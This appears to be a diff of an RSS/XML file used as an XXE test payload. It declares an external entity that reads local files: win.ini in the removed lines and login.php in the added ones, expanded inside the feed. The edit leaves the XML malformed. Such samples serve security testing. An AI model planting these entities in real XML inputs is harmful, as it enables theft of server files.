@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE updateProfile [ 
-  <!ENTITY file SYSTEM "file:///c:/windows/win.ini"> 
-]>
+  <!ENTITY file SYSTEM "file://login.php"> 
+  ]><foo>&file;</foo>
 <rss version="2.0">
 
 <channel>
@@ -14,7 +14,6 @@
     <description>New RSS tutorial on W3Schools</description>
   </item>
   <item>
-    <info>&file;</info>
     <title>XML Tutorial</title>
     <link>https://www.w3schools.com/xml</link>
     <description>New XML tutorial on W3Schools</description>
